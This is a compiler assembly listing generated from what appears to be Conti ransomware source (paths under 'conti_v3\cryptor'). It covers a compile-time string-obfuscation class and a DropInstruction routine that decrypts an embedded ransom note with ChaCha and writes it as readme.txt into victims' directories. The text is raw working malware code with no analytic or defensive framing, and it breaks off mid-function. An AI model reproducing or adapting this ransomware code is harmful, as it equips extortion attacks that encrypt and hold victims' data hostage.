  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  003d1	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  003d5	88 85 c0 00 00
	00		 mov	 BYTE PTR tv252[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  003db	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  003e2	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  003e9	5f		 pop	 rdi
  003ea	5d		 pop	 rbp
  003eb	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
_TEXT	SEGMENT
str$ = 8
Filename$ = 40
hFile$ = 104
dwDecryptNote$ = 132
DecryptNote$ = 168
CryptCtx$ = 208
ChaChaKey$ = 296
ChaChaIV$ = 360
DecryptNotePlainText$ = 392
BytesWritten$ = 420
$T9 = 840
$T10 = 888
$T11 = 952
$T12 = 984
$T13 = 1048
tv74 = 1064
__$ArrayPad$ = 1072
Directory$ = 1120
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z PROC ; DropInstruction, COMDAT

; 104  : {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 04
	00 00		 sub	 rsp, 1160		; 00000488H
  0000e	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00013	48 8d 7c 24 40	 lea	 rdi, QWORD PTR [rsp+64]
  00018	b9 b2 00 00 00	 mov	 ecx, 178		; 000000b2H
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	04 00 00	 mov	 rcx, QWORD PTR [rsp+1192]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 30 04
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 105  : 	LPCWSTR str = OBFW(L"readme.txt");

  00049	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@
  00050	48 8d 8d 48 03
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  00057	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
  0005c	48 8b c8	 mov	 rcx, rax
  0005f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
  00064	48 89 45 08	 mov	 QWORD PTR str$[rbp], rax

; 106  : 	std::wstring Filename = MakePath(Directory, str);

  00068	48 8d 85 78 03
	00 00		 lea	 rax, QWORD PTR $T10[rbp]
  0006f	48 89 85 b8 03
	00 00		 mov	 QWORD PTR $T11[rbp], rax
  00076	48 8d 85 d8 03
	00 00		 lea	 rax, QWORD PTR $T12[rbp]
  0007d	48 89 85 18 04
	00 00		 mov	 QWORD PTR $T13[rbp], rax
  00084	48 8b 55 08	 mov	 rdx, QWORD PTR str$[rbp]
  00088	48 8b 8d b8 03
	00 00		 mov	 rcx, QWORD PTR $T11[rbp]
  0008f	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00094	48 89 85 28 04
	00 00		 mov	 QWORD PTR tv74[rbp], rax
  0009b	48 8b 95 60 04
	00 00		 mov	 rdx, QWORD PTR Directory$[rbp]
  000a2	48 8b 8d 18 04
	00 00		 mov	 rcx, QWORD PTR $T13[rbp]
  000a9	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000ae	48 8b 8d 28 04
	00 00		 mov	 rcx, QWORD PTR tv74[rbp]
  000b5	4c 8b c1	 mov	 r8, rcx
  000b8	48 8b d0	 mov	 rdx, rax
  000bb	48 8d 4d 28	 lea	 rcx, QWORD PTR Filename$[rbp]
  000bf	e8 00 00 00 00	 call	 ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath

; 107  : 
; 108  : 	HANDLE hFile = pCreateFileW(

  000c4	48 8d 4d 28	 lea	 rcx, QWORD PTR Filename$[rbp]
  000c8	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  000cd	48 c7 44 24 30
	00 00 00 00	 mov	 QWORD PTR [rsp+48], 0
  000d6	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  000de	c7 44 24 20 02
	00 00 00	 mov	 DWORD PTR [rsp+32], 2
  000e6	45 33 c9	 xor	 r9d, r9d
  000e9	45 33 c0	 xor	 r8d, r8d
  000ec	ba 00 00 00 40	 mov	 edx, 1073741824		; 40000000H
  000f1	48 8b c8	 mov	 rcx, rax
  000f4	e8 00 00 00 00	 call	 ?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z ; pCreateFileW
  000f9	48 89 45 68	 mov	 QWORD PTR hFile$[rbp], rax

; 109  : 		Filename.c_str(),
; 110  : 		GENERIC_WRITE,
; 111  : 		0,
; 112  : 		NULL,
; 113  : 		CREATE_ALWAYS,
; 114  : 		0,
; 115  : 		NULL);
; 116  : 
; 117  : 	if (hFile == INVALID_HANDLE_VALUE) {

  000fd	48 83 7d 68 ff	 cmp	 QWORD PTR hFile$[rbp], -1
  00102	75 1a		 jne	 SHORT $LN2@DropInstru

; 118  : 		return;

  00104	48 8d 4d 28	 lea	 rcx, QWORD PTR Filename$[rbp]
  00108	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0010d	48 8b 8d 60 04
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00114	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00119	e9 80 01 00 00	 jmp	 $LN1@DropInstru
$LN2@DropInstru:

; 119  : 	}
; 120  : 
; 121  : 	DWORD dwDecryptNote = 0;

  0011e	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR dwDecryptNote$[rbp], 0

; 122  : 	LPSTR DecryptNote = global::GetDecryptNote();

  00128	e8 00 00 00 00	 call	 ?GetDecryptNote@global@@YAPEADXZ ; global::GetDecryptNote
  0012d	48 89 85 a8 00
	00 00		 mov	 QWORD PTR DecryptNote$[rbp], rax

; 123  : 
; 124  : 	ECRYPT_ctx CryptCtx;
; 125  : 	BYTE ChaChaKey[32];
; 126  : 	BYTE ChaChaIV[8];
; 127  : 
; 128  : 	memcpy(ChaChaKey, DecryptNote, 32);

  00134	41 b8 20 00 00
	00		 mov	 r8d, 32			; 00000020H
  0013a	48 8b 95 a8 00
	00 00		 mov	 rdx, QWORD PTR DecryptNote$[rbp]
  00141	48 8d 8d 28 01
	00 00		 lea	 rcx, QWORD PTR ChaChaKey$[rbp]
  00148	e8 00 00 00 00	 call	 memcpy

; 129  : 	memcpy(ChaChaIV, DecryptNote + 32, 8);

  0014d	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR DecryptNote$[rbp]
  00154	48 83 c0 20	 add	 rax, 32			; 00000020H
  00158	41 b8 08 00 00
	00		 mov	 r8d, 8
  0015e	48 8b d0	 mov	 rdx, rax
  00161	48 8d 8d 68 01
	00 00		 lea	 rcx, QWORD PTR ChaChaIV$[rbp]
  00168	e8 00 00 00 00	 call	 memcpy

; 130  : 	memcpy(&dwDecryptNote, DecryptNote + 40, 4);

  0016d	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR DecryptNote$[rbp]
  00174	48 83 c0 28	 add	 rax, 40			; 00000028H
  00178	41 b8 04 00 00
	00		 mov	 r8d, 4
  0017e	48 8b d0	 mov	 rdx, rax
  00181	48 8d 8d 84 00
	00 00		 lea	 rcx, QWORD PTR dwDecryptNote$[rbp]
  00188	e8 00 00 00 00	 call	 memcpy

; 131  : 
; 132  : 	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);

  0018d	8b 85 84 00 00
	00		 mov	 eax, DWORD PTR dwDecryptNote$[rbp]
  00193	8b c8		 mov	 ecx, eax
  00195	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  0019a	48 89 85 88 01
	00 00		 mov	 QWORD PTR DecryptNotePlainText$[rbp], rax

; 133  : 	if (!DecryptNotePlainText) {

  001a1	48 83 bd 88 01
	00 00 00	 cmp	 QWORD PTR DecryptNotePlainText$[rbp], 0
  001a9	75 23		 jne	 SHORT $LN3@DropInstru

; 134  : 
; 135  : 		pCloseHandle(hFile);

  001ab	48 8b 4d 68	 mov	 rcx, QWORD PTR hFile$[rbp]
  001af	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle

; 136  : 		return;

  001b4	48 8d 4d 28	 lea	 rcx, QWORD PTR Filename$[rbp]
  001b8	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  001bd	48 8b 8d 60 04
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  001c4	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  001c9	e9 d0 00 00 00	 jmp	 $LN1@DropInstru
$LN3@DropInstru:

; 137  : 
; 138  : 	}
; 139  : 
; 140  : 	RtlSecureZeroMemory(&CryptCtx, sizeof(CryptCtx));

  001ce	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  001d3	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR CryptCtx$[rbp]
  001da	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 141  : 	ECRYPT_keysetup(&CryptCtx, ChaChaKey, 256, 64);

  001df	41 b9 40 00 00
	00		 mov	 r9d, 64			; 00000040H
  001e5	41 b8 00 01 00
	00		 mov	 r8d, 256		; 00000100H
  001eb	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR ChaChaKey$[rbp]
  001f2	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR CryptCtx$[rbp]
  001f9	e8 00 00 00 00	 call	 ECRYPT_keysetup

; 142  : 	ECRYPT_ivsetup(&CryptCtx, ChaChaIV);

  001fe	48 8d 95 68 01
	00 00		 lea	 rdx, QWORD PTR ChaChaIV$[rbp]
  00205	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR CryptCtx$[rbp]
  0020c	e8 00 00 00 00	 call	 ECRYPT_ivsetup

; 143  : 
; 144  : 	ECRYPT_decrypt_bytes(&CryptCtx, (PBYTE)DecryptNote + 44, (PBYTE)DecryptNotePlainText, dwDecryptNote);

  00211	48 8b 85 a8 00
	00 00		 mov	 rax, QWORD PTR DecryptNote$[rbp]
  00218	48 83 c0 2c	 add	 rax, 44			; 0000002cH
  0021c	44 8b 8d 84 00
	00 00		 mov	 r9d, DWORD PTR dwDecryptNote$[rbp]
  00223	4c 8b 85 88 01
	00 00		 mov	 r8, QWORD PTR DecryptNotePlainText$[rbp]
  0022a	48 8b d0	 mov	 rdx, rax
  0022d	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR CryptCtx$[rbp]
  00234	e8 00 00 00 00	 call	 ECRYPT_decrypt_bytes

; 145  : 
; 146  : 	DWORD BytesWritten;
; 147  : 	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &BytesWritten, NULL);

  00239	48 c7 44 24 20
	00 00 00 00	 mov	 QWORD PTR [rsp+32], 0
  00242	4c 8d 8d a4 01
	00 00		 lea	 r9, QWORD PTR BytesWritten$[rbp]
  00249	44 8b 85 84 00
	00 00		 mov	 r8d, DWORD PTR dwDecryptNote$[rbp]
  00250	48 8b 95 88 01
	00 00		 mov	 rdx, QWORD PTR DecryptNotePlainText$[rbp]
  00257	48 8b 4d 68	 mov	 rcx, QWORD PTR hFile$[rbp]
  0025b	e8 00 00 00 00	 call	 ?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z ; pWriteFile

; 148  : 	pCloseHandle(hFile);

  00260	48 8b 4d 68	 mov	 rcx, QWORD PTR hFile$[rbp]
  00264	e8 00 00 00 00	 call	 ?pCloseHandle@@YAHPEAX@Z ; pCloseHandle

; 149  : 	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);

  00269	8b 85 84 00 00
	00		 mov	 eax, DWORD PTR dwDecryptNote$[rbp]
  0026f	8b d0		 mov	 edx, eax
  00271	48 8b 8d 88 01
	00 00		 mov	 rcx, QWORD PTR DecryptNotePlainText$[rbp]
  00278	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 150  : 	free(DecryptNotePlainText);

  0027d	48 8b 8d 88 01
	00 00		 mov	 rcx, QWORD PTR DecryptNotePlainText$[rbp]
  00284	e8 00 00 00 00	 call	 free

; 151  : }

  00289	48 8d 4d 28	 lea	 rcx, QWORD PTR Filename$[rbp]
  0028d	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00292	48 8b 8d 60 04
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00299	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN1@DropInstru:
  0029e	48 8d 4d c0	 lea	 rcx, QWORD PTR [rbp-64]
  002a2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z$rtcFrameData
  002a9	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  002ae	48 8b 8d 30 04
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  002b5	48 33 cd	 xor	 rcx, rbp
  002b8	e8 00 00 00 00	 call	 __security_check_cookie
  002bd	48 8d a5 48 04
	00 00		 lea	 rsp, QWORD PTR [rbp+1096]
  002c4	5f		 pop	 rdi
  002c5	5d		 pop	 rbp
  002c6	c3		 ret	 0
?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ENDP ; DropInstruction
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 0f	 sub	 eax, 15
  0002d	6b c0 f5	 imul	 eax, eax, -11
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
